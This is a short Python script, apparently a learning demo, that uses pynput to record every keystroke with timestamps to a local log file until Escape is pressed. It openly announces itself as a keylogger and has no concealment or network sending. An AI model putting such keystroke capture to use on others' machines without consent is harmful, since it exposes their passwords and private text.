from pynput import keyboard
import logging
from datetime import datetime

# Set up log file
log_file = "log.txt"

# Configure logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on pressing Escape
        return False

print("🟢 Keylogger started... (Press ESC to stop)")

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
